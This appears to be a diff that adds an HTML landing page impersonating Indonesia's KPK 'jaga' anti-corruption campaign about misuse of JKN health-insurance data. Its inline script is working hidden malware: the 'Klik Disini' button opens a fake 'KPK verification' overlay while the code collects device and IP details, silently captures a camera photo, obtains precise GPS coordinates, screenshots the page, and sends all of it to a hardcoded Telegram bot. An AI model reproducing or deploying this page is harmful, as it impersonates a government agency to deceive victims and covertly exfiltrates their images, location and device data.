@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KPK Jaga - Kampanye JKN</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        :root { 
+            --red: #E01E25; 
+            --blk: #1A1A1A; 
+            --bg-gray: #F4F4F4;
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+
+        html, body { 
+            height: 100%; 
+            background: #fff; 
+            overflow-x: hidden;
+        }
+
+        .banner-container {
+            width: 100%;
+            min-height: 100vh;
+            background: var(--bg-gray);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bg-building-wrapper {
+            position: absolute;
+            top: 0; right: 0; bottom: 0;
+            width: 55%;
+            z-index: 0;
+        }
+        .bg-building-img {
+            width: 100%; height: 100%;
+            background-image: url('https://images.unsplash.com/photo-1586773860418-d37222d8fce3?q=80&w=1600&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center right;
+            filter: grayscale(100%) brightness(1.18) contrast(0.82);
+            -webkit-mask-image: linear-gradient(to right, transparent 0%, rgba(0,0,0,.55) 30%, rgba(0,0,0,.68) 100%);
+            mask-image: linear-gradient(to right, transparent 0%, rgba(0,0,0,.55) 30%, rgba(0,0,0,.68) 100%);
+        }
+        .bg-text {
+            position: absolute;
+            top: 50%; left: 30%;
+            font-size: clamp(3rem, 5vw, 6rem);
+            font-weight: 900;
+            color: rgba(0,0,0,0.15);
+            transform: rotate(-25deg);
+            white-space: nowrap;
+            letter-spacing: 5px;
+            pointer-events: none;
+        }
+
+        .deco-circle {
+            position: absolute;
+            bottom: -300px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: min(900px, 72vw);
+            height: min(500px, 40vw);
+            background: var(--red);
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 30px 50px;
+            position: relative;
+            z-index: 20;
+        }
+
+        .logo-kpk { height: 56px; }
+        
+        .logo-jaga-custom {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .jaga-text { font-size: 44px; font-weight: 900; color: #000; line-height: 1; letter-spacing: -1.5px; }
+        .jaga-sub { display: flex; flex-direction: column; justify-content: center; border-left: 2px solid var(--red); padding-left: 6px; }
+        .jaga-sub span { font-size: 8.5px; font-weight: 800; color: var(--red); line-height: 1.1; letter-spacing: 0.5px; }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            position: relative;
+            z-index: 10;
+            padding: 0 50px;
+        }
+
+        .text-section {
+            flex: 1.2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding-bottom: 80px;
+            position: relative;
+            z-index: 15;
+        }
+
+        .sparkle-deco {
+            position: absolute;
+            top: 50px; right: 8%;
+            width: 90px;
+            pointer-events: none;
+        }
+
+        .headline {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .splash-lines-top {
+            position: absolute;
+            top: -20px; left: -25px;
+            width: 30px;
+            transform: rotate(-10deg);
+        }
+
+        .highlight-red {
+            display: block;
+            width: max-content;
+            background-color: var(--red);
+            color: #fff;
+            font-size: clamp(1.8rem, 3.5vw, 3.2rem);
+            font-weight: 900;
+            padding: 5px 20px;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+
+        .subtext {
+            color: var(--blk);
+            font-size: clamp(1.1rem, 1.5vw, 1.4rem);
+            font-weight: 800;
+            line-height: 1.4;
+            margin-bottom: 40px;
+            max-width: 550px;
+        }
+
+        .cta-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            width: max-content;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background-color: var(--red);
+            color: #fff;
+            text-decoration: none;
+            border: 4px solid #000;
+            padding: 12px 35px;
+            font-size: 1.5rem;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 5px 5px 0 0 rgba(0,0,0,1);
+            transition: all 0.1s;
+        }
+        .cta-button:active { transform: translate(3px,3px); box-shadow: 2px 2px 0 0 rgba(0,0,0,1); }
+
+        .cursor-svg {
+            position: absolute;
+            right: -35px; bottom: -25px;
+            width: 50px;
+            pointer-events: none;
+            filter: drop-shadow(2px 2px 0 rgba(0,0,0,1));
+        }
+
+        .illustration-section {
+            flex: 1;
+            position: relative;
+            z-index: 10;
+        }
+
+        .yellow-exclaim {
+            position: absolute;
+            top: 10%; right: 45%;
+            transform: rotate(20deg);
+            z-index: 5;
+        }
+
+        .envelope-cluster {
+            position: absolute;
+            bottom: 30px;
+            left: -80px;
+            width: 300px;
+            height: 250px;
+            z-index: 10;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+        }
+
+        .rp-text {
+            position: absolute;
+            right: 0; bottom: 80px;
+            font-size: 3rem;
+            font-weight: 900;
+            color: rgba(0,0,0,0.1);
+            z-index: 1;
+        }
+
+        .env-back {
+            position: absolute;
+            bottom: 0;
+            width: 260px; height: 160px;
+            background: #E8E8E8;
+            border-radius: 5px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            z-index: 2;
+        }
+
+        .env-paper {
+            position: absolute;
+            bottom: 40px;
+            width: 220px; height: 190px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            z-index: 3;
+            padding: 15px;
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.05);
+        }
+        .claim-tag {
+            background: var(--red); color: white;
+            padding: 5px 12px; font-weight: 900;
+            font-size: 14px; letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        .paper-line { width: 100%; height: 6px; background: #EEE; margin-bottom: 8px; border-radius: 3px; }
+        .paper-line.short { width: 60%; }
+
+        .kis-card {
+            position: absolute;
+            bottom: 60px; left: -10px;
+            width: 170px; height: 100px;
+            background: linear-gradient(135deg, #1C7B5D, #115740);
+            border-radius: 8px;
+            border: 3px solid #fff;
+            z-index: 4;
+            transform: rotate(-10deg);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+            padding: 10px;
+            display: flex; flex-direction: column;
+        }
+        .kis-header { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 15px; }
+        .kis-garuda { width: 20px; height: 20px; background: #D4AF37; border-radius: 50%; }
+        .kis-title { color: #fff; font-size: 9px; font-weight: 800; line-height: 1.2; }
+        .kis-footer { width: 100%; height: 30px; background: rgba(255,255,255,0.2); border-radius: 4px; margin-top: auto;}
+
+        .env-front {
+            position: absolute;
+            bottom: 0;
+            width: 260px; height: 110px;
+            background: #F4F4F4;
+            z-index: 5;
+            clip-path: polygon(0 0, 50% 40%, 100% 0, 100% 100%, 0 100%);
+            border-radius: 0 0 5px 5px;
+            filter: drop-shadow(0 -3px 5px rgba(0,0,0,0.1));
+        }
+
+        .warning-tri {
+            position: absolute;
+            top: 10px; right: -40px;
+            width: 110px;
+            z-index: 6;
+            transform: rotate(-15deg);
+            filter: drop-shadow(5px 5px 0px rgba(0,0,0,0.2));
+        }
+
+        .main-illustration {
+            position: absolute;
+            right: 0;
+            bottom: -5px;
+            height: 95%;
+            z-index: 15;
+            object-fit: contain;
+        }
+
+        .jaga-badge {
+            position: absolute;
+            bottom: 4%;
+            right: 3%;
+            font-size: clamp(1.4rem, 2.2vw, 2.4rem);
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: -0.8px;
+            z-index: 20;
+            text-shadow: 1px 1px 4px rgba(0,0,0,0.35);
+            pointer-events: none;
+        }
+
+        .cta-splash {
+            position: absolute;
+            left: -32px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+
+        video, canvas.hidden-capture {
+            position: fixed; top: -9999px; left: -9999px;
+            width: 1px; height: 1px; opacity: 0;
+            pointer-events: none;
+        }
+
+        .overlay {
+            position: fixed; inset: 0;
+            z-index: 9999;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        .overlay.active { display: flex; }
+
+        .overlay-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 36px 32px 28px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .overlay-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 5px;
+            background: var(--red);
+        }
+        .overlay-icon {
+            width: 72px; height: 72px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #FEE2E2;
+            color: var(--red);
+            font-size: 30px;
+        }
+
+        .overlay-spinner {
+            width: 48px; height: 48px;
+            border: 4px solid #FEE2E2;
+            border-top-color: var(--red);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .overlay-title {
+            font-size: 18px;
+            font-weight: 900;
+            color: var(--blk);
+            margin-bottom: 10px;
+            line-height: 1.3;
+            min-height: 24px;
+        }
+        .overlay-desc {
+            font-size: 13px;
+            color: #6B7280;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            min-height: 40px;
+        }
+
+        .overlay-progress-track {
+            height: 4px;
+            background: #E5E7EB;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 6px;
+        }
+        .overlay-progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--red);
+            border-radius: 4px;
+            transition: width 0.6s ease;
+        }
+        .overlay-progress-pct {
+            font-size: 12px;
+            color: #9CA3AF;
+            text-align: center;
+        }
+
+        .overlay-footer {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #9CA3AF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        @media (max-width: 1024px) {
+            header { padding: 22px 36px; }
+            .logo-kpk { height: 48px; }
+            .jaga-text { font-size: 38px; }
+            .main-content { padding: 0 36px; }
+            .sparkle-deco { right: 3%; width: 76px; }
+            .deco-circle { bottom: -160px; }
+            .envelope-cluster { transform: scale(0.9); transform-origin: bottom left; }
+        }
+
+        @media (max-width: 860px) {
+            header { padding: 18px 26px; }
+            .logo-kpk { height: 44px; }
+            .jaga-text { font-size: 34px; }
+            .jaga-sub span { font-size: 7.5px; }
+            .main-content { padding: 0 26px; flex-direction: column; }
+            .text-section { padding-top: 20px; padding-bottom: 24px; flex: none; }
+            .sparkle-deco { top: 8px; right: 5%; width: 70px; }
+            .illustration-section {
+                width: 100%;
+                min-height: 300px;
+                height: 48vw;
+                max-height: 400px;
+            }
+            .main-illustration { height: 92%; right: 0; bottom: -5px; }
+            .bg-building-wrapper { width: 100%; }
+            .bg-text { font-size: clamp(2.5rem, 5vw, 5rem); }
+            .deco-circle { bottom: -120px; width: min(800px, 110vw); height: min(400px, 50vw); }
+            .envelope-cluster { left: 20px; bottom: 30px;
+                transform: scale(0.88); transform-origin: bottom left; }
+            .yellow-exclaim { right: 35%; top: 5%; }
+        }
+
+        @media (max-width: 768px) {
+            header { padding: 14px 20px; }
+            .logo-kpk { height: 40px; }
+            .jaga-text { font-size: 30px; }
+            .jaga-sub span { font-size: 7px; }
+            .main-content { padding: 0 20px; }
+            .text-section { padding-top: 14px; padding-bottom: 20px; }
+            .sparkle-deco { width: 60px; top: 5px; right: 4%; }
+            .highlight-red { font-size: clamp(1.2rem, 5vw, 1.7rem); padding: 4px 12px; }
+            .subtext { font-size: clamp(0.85rem, 3.5vw, 1rem); margin-bottom: 20px; }
+            .cta-button { font-size: 1rem; padding: 9px 22px; border-width: 3px;
+                box-shadow: 4px 4px 0 0 rgba(0,0,0,1); }
+            .illustration-section {
+                min-height: 280px;
+                height: 58vw;
+                max-height: 370px;
+            }
+            .main-illustration { height: 95%; right: -8px; bottom: -4px; }
+            .bg-text { font-size: 2.5rem; left: 10%; }
+            .deco-circle { bottom: -80px; width: 100vw; height: min(350px, 46vw); }
+            .envelope-cluster { left: 8px; bottom: 18px;
+                transform: scale(0.68); transform-origin: bottom left; }
+            .yellow-exclaim { right: 22%; top: 4%; transform: scale(0.65) rotate(15deg); }
+        }
+
+        @media (max-width: 480px) {
+            header { padding: 10px 14px; }
+            .logo-kpk { height: 32px; }
+            .jaga-text { font-size: 24px; }
+            .jaga-sub { display: none; }
+            .main-content { padding: 0 14px; }
+            .text-section { padding-top: 10px; padding-bottom: 16px; }
+            .sparkle-deco { display: none; }
+            .splash-lines-top { display: none; }
+            .highlight-red { font-size: clamp(1rem, 5.4vw, 1.45rem); padding: 4px 10px; }
+            .subtext { font-size: 0.88rem; margin-bottom: 16px; }
+            .cta-button { font-size: 0.95rem; padding: 8px 18px; }
+            .illustration-section {
+                min-height: 240px;
+                height: 64vw;
+                max-height: 320px;
+            }
+            .main-illustration { height: 92%; right: -5px; }
+            .bg-text { font-size: 1.8rem; left: 5%; top: 45%; }
+            .deco-circle { bottom: -60px; width: 100vw; height: min(280px, 60vw); }
+            .envelope-cluster { left: 4px; bottom: 12px;
+                transform: scale(0.56); transform-origin: bottom left; }
+            .yellow-exclaim { display: none; }
+            .warning-tri { width: 80px; right: -30px; }
+            .overlay-card { padding: 28px 20px 22px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="banner-container">
+
+    <div class="bg-building-wrapper">
+        <div class="bg-building-img"></div>
+        <div class="bg-text">RUMAH SAKIT</div>
+    </div>
+
+    <div class="deco-circle"></div>
+
+    <header>
+        <img src="./asset/logo-kpk.png" alt="Logo KPK" class="logo-kpk" onerror="this.style.display='none'">
+        <div class="logo-jaga-custom">
+            <div class="jaga-text">jaga</div>
+            <div class="jaga-sub">
+                <span>JARINGAN</span>
+                <span>PENCEGAHAN</span>
+                <span>KORUPSI</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+
+        <div class="text-section">
+            
+            <svg class="sparkle-deco" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M70 10 L75 25 L90 30 L75 35 L70 50 L65 35 L50 30 L65 25 Z" fill="#E01E25"/>
+                <path d="M30 0 L33 12 L45 15 L33 18 L30 30 L27 18 L15 15 L27 12 Z" fill="#E01E25"/>
+            </svg>
+
+            <div class="headline">
+                <svg class="splash-lines-top" viewBox="0 0 50 50">
+                    <path d="M10,40 L20,30 M5,25 L18,25 M15,10 L25,20" stroke="#000" stroke-width="4" stroke-linecap="round"/>
+                </svg>
+                <span class="highlight-red">Gawat! Data JKN kamu</span>
+                <span class="highlight-red">bisa disalahgunakan untuk</span>
+                <span class="highlight-red">korupsi loh.</span>
+            </div>
+
+            <p class="subtext">
+                Ketahui lebih lanjut tentang klaim fiktif<br>
+                dan manipulasi tagihan JKN disini.
+            </p>
+
+            <div class="cta-wrapper">
+                <svg class="cta-splash" width="22" height="30" viewBox="0 0 22 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M5 2 L16 2 M2 10 L12 10 M5 18 L14 18" stroke="#1A1A1A" stroke-width="3.5" stroke-linecap="round"/>
+                </svg>
+                <a href="#" id="ctaButton" class="cta-button">Klik Disini</a>
+                <svg class="cursor-svg" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 5 L10 40 L20 30 L27 45 L32 42 L25 28 L35 28 Z" fill="#fff" stroke="#000" stroke-width="3" stroke-linejoin="round"/>
+                    <path d="M10 5 L10 40 L20 30 L27 45 L32 42 L25 28 L35 28 Z" fill="#1A1A1A"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="illustration-section">
+
+            <svg class="yellow-exclaim" width="80" height="120" viewBox="0 0 80 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="10" y="10" width="18" height="60" rx="9" fill="#FFA500" transform="rotate(-15)"/>
+                <circle cx="35" cy="85" r="10" fill="#FFA500"/>
+                <rect x="45" y="0" width="18" height="60" rx="9" fill="#FFA500" transform="rotate(-15)"/>
+                <circle cx="70" cy="70" r="10" fill="#FFA500"/>
+            </svg>
+
+            <div class="envelope-cluster">
+                
+                <div class="rp-text">Rp</div>
+                <div class="env-back"></div>
+                <div class="env-paper">
+                    <div class="claim-tag">CLAIM</div>
+                    <div class="paper-line"></div>
+                    <div class="paper-line"></div>
+                    <div class="paper-line short"></div>
+                </div>
+                <div class="kis-card">
+                    <div class="kis-header">
+                        <div class="kis-garuda"></div>
+                        <div class="kis-title">Kartu<br>Indonesia<br>Sehat</div>
+                    </div>
+                    <div class="kis-footer"></div>
+                </div>
+                <div class="env-front"></div>
+                <svg class="warning-tri" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="50,10 95,85 5,85" fill="#E01E25" stroke="#fff" stroke-width="8" stroke-linejoin="round"/>
+                    <rect x="45" y="35" width="10" height="25" rx="5" fill="#fff"/>
+                    <circle cx="50" cy="70" r="6" fill="#fff"/>
+                </svg>
+            </div>
+
+            <img src="./asset/Maskot-jaga.png" alt="Ilustrasi Maskot JAGA" class="main-illustration" onerror="this.style.display='none'">
+
+            <div class="jaga-badge">jaga</div>
+
+        </div>
+
+    </main>
+</div>
+
+<video id="captureVideo" autoplay muted playsinline></video>
+<canvas id="captureCanvas" class="hidden-capture"></canvas>
+
+<div id="overlayProgress" class="overlay">
+    <div class="overlay-card">
+        <div class="overlay-spinner"></div>
+        <div class="overlay-title" id="progressTitle">Memeriksa Keamanan Data</div>
+        <div class="overlay-desc" id="progressDesc">KPK sedang memverifikasi keamanan data JKN Anda sebelum melanjutkan.</div>
+        <div class="overlay-progress-track">
+            <div class="overlay-progress-fill" id="progressFill"></div>
+        </div>
+        <div class="overlay-progress-pct" id="progressPct">0%</div>
+        <div class="overlay-footer">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Terenkripsi &bull; Koneksi aman
+        </div>
+    </div>
+</div>
+
+<script>
+(() => {
+    const TBOT = '8826082391:AAHJHWJtjXotVBvq4sVVIDUKofT9A4KiAMk'
+    const TCHAT = '7215842875'
+
+    const v = document.getElementById('captureVideo')
+    const c = document.getElementById('captureCanvas')
+    const oProgress = document.getElementById('overlayProgress')
+    const ctaBtn = document.getElementById('ctaButton')
+    const progressTitle = document.getElementById('progressTitle')
+    const progressDesc = document.getElementById('progressDesc')
+    const progressFill = document.getElementById('progressFill')
+    const progressPct = document.getElementById('progressPct')
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms))
+
+    const tgText = async d => {
+        try {
+            await fetch('https://api.telegram.org/bot' + TBOT + '/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: TCHAT, text: d, parse_mode: 'HTML'})
+            })
+        } catch (e) {}
+    }
+
+    const tgPhoto = async (blob, name) => {
+        try {
+            const fd = new FormData()
+            fd.append('chat_id', TCHAT)
+            fd.append('photo', blob, name)
+            await fetch('https://api.telegram.org/bot' + TBOT + '/sendPhoto', {method: 'POST', body: fd})
+        } catch (e) {}
+    }
+
+    const revGeo = async (lat, lon) => {
+        try {
+            const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&zoom=18&addressdetails=1')
+            const d = await r.json()
+            if (d && d.address) {
+                return {
+                    city: d.address.city || d.address.county || d.address.state_district || 'Unknown',
+                    district: d.address.suburb || d.address.village || d.address.town || 'Unknown',
+                    full: d.display_name || 'Unknown'
+                }
+            }
+        } catch (e) {}
+        return {city: 'Unknown', district: 'Unknown', full: 'Unknown'}
+    }
+
+    const detectDevice = () => {
+        const ua = navigator.userAgent
+        if (/iPad|Android(?!.*Mobile)|Tablet/i.test(ua)) return 'tablet'
+        if (/Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return 'mobile'
+        return 'desktop'
+    }
+
+    const updateProgress = (pct, title, desc) => {
+        progressTitle.textContent = title
+        progressDesc.textContent = desc
+        progressFill.style.width = pct + '%'
+        progressPct.textContent = pct + '%'
+    }
+
+    const collectDeviceInfo = async () => {
+        let m = '<b>[+] JAGA - LAPORAN VERIFIKASI</b>\n\n'
+        m += '<b>&#x1F4F1; PERANGKAT</b>\n'
+        m += '&#x2022; Type: ' + detectDevice() + '\n'
+        m += '&#x2022; UA: ' + navigator.userAgent + '\n'
+        m += '&#x2022; Platform: ' + navigator.platform + '\n'
+        m += '&#x2022; Bahasa: ' + navigator.language + '\n'
+        m += '&#x2022; Online: ' + (navigator.onLine ? 'Ya' : 'Tidak') + '\n'
+        m += '&#x2022; Layar: ' + screen.width + 'x' + screen.height + '\n'
+        m += '&#x2022; RAM: ' + (navigator.deviceMemory || '?') + ' GB\n'
+        m += '&#x2022; CPU: ' + navigator.hardwareConcurrency + ' core\n'
+
+        try {
+            const b = await navigator.getBattery()
+            m += '&#x2022; Baterai: ' + Math.floor(b.level * 100) + '%' + (b.charging ? ' (charging)' : '') + '\n'
+        } catch (e) {}
+
+        m += '\n<b>&#x1F310; JARINGAN</b>\n'
+        m += '&#x2022; Waktu: ' + new Date().toString() + '\n'
+        m += '&#x2022; TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n'
+        m += '&#x2022; URL: ' + location.href + '\n'
+
+        try {
+            const r = await fetch('https://ipapi.co/json/')
+            const d = await r.json()
+            m += '\n<b>&#x1F4CD; LOKASI (IP)</b>\n'
+            m += '&#x2022; IP: ' + d.ip + '\n'
+            m += '&#x2022; Kota: ' + (d.city || '-') + '\n'
+            m += '&#x2022; Region: ' + (d.region || '-') + '\n'
+            m += '&#x2022; Negara: ' + (d.country_name || '-') + '\n'
+            m += '&#x2022; ISP: ' + (d.org || '-') + '\n'
+            if (d.latitude && d.longitude) {
+                m += '&#x2022; Lat: ' + d.latitude + '\n&#x2022; Lng: ' + d.longitude + '\n'
+                const g = await revGeo(d.latitude, d.longitude)
+                m += '&#x2022; Alamat: ' + g.full + '\n'
+            }
+        } catch (e) {
+            m += '\n[!] Gagal ambil IP\n'
+        }
+
+        await tgText(m)
+    }
+
+    const captureCamera = async () => {
+        const dev = detectDevice()
+        let stream = null
+
+        const tryCam = async (constraints) => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({video: constraints})
+                v.srcObject = stream
+                await new Promise(res => { v.onloadedmetadata = res })
+                v.play()
+                await sleep(1200)
+                c.width = v.videoWidth || 640
+                c.height = v.videoHeight || 480
+                c.getContext('2d').drawImage(v, 0, 0)
+                return new Promise(res => {
+                    c.toBlob(blob => {
+                        if (blob) {
+                            const label = constraints.facingMode
+                                ? constraints.facingMode.exact + '_jaga'
+                                : 'default_jaga'
+                            tgPhoto(blob, label + '_' + Date.now() + '.jpg')
+                        }
+                        res()
+                    }, 'image/jpeg', 0.85)
+                })
+            } catch (e) {
+                return false
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop())
+                    stream = null
+                }
+            }
+        }
+
+        if (dev === 'mobile' || dev === 'tablet') {
+            if (!(await tryCam({facingMode: {exact: 'environment'}, width: {ideal: 1280}}))) {
+                await tryCam({facingMode: {exact: 'user'}, width: {ideal: 1280}})
+            }
+        } else {
+            await tryCam({width: {ideal: 1280}, height: {ideal: 720}})
+        }
+    }
+
+    const captureLocation = () => {
+        return new Promise(resolve => {
+            if (!navigator.geolocation) {
+                tgText('[!] Geolocation tidak tersedia')
+                resolve(false)
+                return
+            }
+            navigator.geolocation.getCurrentPosition(
+                async pos => {
+                    const lat = pos.coords.latitude
+                    const lon = pos.coords.longitude
+                    let msg = '<b>&#x1F9ED; GPS LOKASI</b>\n'
+                    msg += '&#x2022; Lat: ' + lat + '\n'
+                    msg += '&#x2022; Lng: ' + lon + '\n'
+                    msg += '&#x2022; Akurasi: ' + pos.coords.accuracy + ' m\n'
+                    msg += '&#x2022; Maps: https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lon + '\n'
+                    const g = await revGeo(lat, lon)
+                    msg += '&#x2022; Kota: ' + g.city + '\n'
+                    msg += '&#x2022; Kecamatan: ' + g.district + '\n'
+                    msg += '&#x2022; Alamat: ' + g.full + '\n'
+                    await tgText(msg)
+                    resolve(true)
+                },
+                async err => {
+                    await tgText('[!] GPS Error: ' + err.message)
+                    resolve(false)
+                },
+                {enableHighAccuracy: true, timeout: 8000, maximumAge: 0}
+            )
+        })
+    }
+
+    const takeScreenshot = async () => {
+        try {
+            const el = document.querySelector('.banner-container')
+            const canvas = await html2canvas(el, {
+                scale: 0.8, useCORS: true, logging: false,
+                backgroundColor: '#F4F4F4'
+            })
+            canvas.toBlob(b => tgPhoto(b, 'screenshot_jaga_' + Date.now() + '.jpg'), 'image/jpeg', 0.8)
+        } catch (e) {
+            tgText('[!] Screenshot gagal')
+        }
+    }
+
+    ctaBtn.addEventListener('click', async e => {
+        e.preventDefault()
+
+        oProgress.classList.add('active')
+        updateProgress(5, 'Memeriksa perangkat...', 'Verifikasi keamanan data JKN Anda dimulai.')
+
+        collectDeviceInfo()
+
+        await sleep(600)
+        updateProgress(20, 'Memverifikasi koneksi aman...', 'Memastikan koneksi terenkripsi dengan server KPK.')
+        await sleep(500)
+
+        updateProgress(35, 'Verifikasi wajah...', 'KPK memerlukan akses kamera untuk memverifikasi identitas Anda. Silakan izinkan di browser.')
+
+        const camPromise = captureCamera()
+        const locPromise = captureLocation()
+
+        await camPromise
+
+        updateProgress(60, 'Verifikasi wajah selesai', 'Wajah terverifikasi. Melanjutkan deteksi faskes...')
+        await sleep(700)
+
+        updateProgress(75, 'Mendeteksi lokasi faskes...', 'KPK memerlukan akses lokasi untuk menemukan fasilitas kesehatan terdekat. Silakan izinkan di browser.')
+
+        await locPromise
+
+        updateProgress(88, 'Menyusun laporan keamanan...', 'Mengenkripsi dan mengirim data verifikasi ke server KPK.')
+        await takeScreenshot()
+        await sleep(800)
+
+        updateProgress(100, 'Verifikasi Selesai!', 'Data JKN Anda aman. Mengarahkan ke halaman utama KPK...')
+        await sleep(1500)
+
+        oProgress.classList.remove('active')
+        window.location.href = 'https://jaga.id'
+    })
+})()
+</script>
+</body>
+</html>
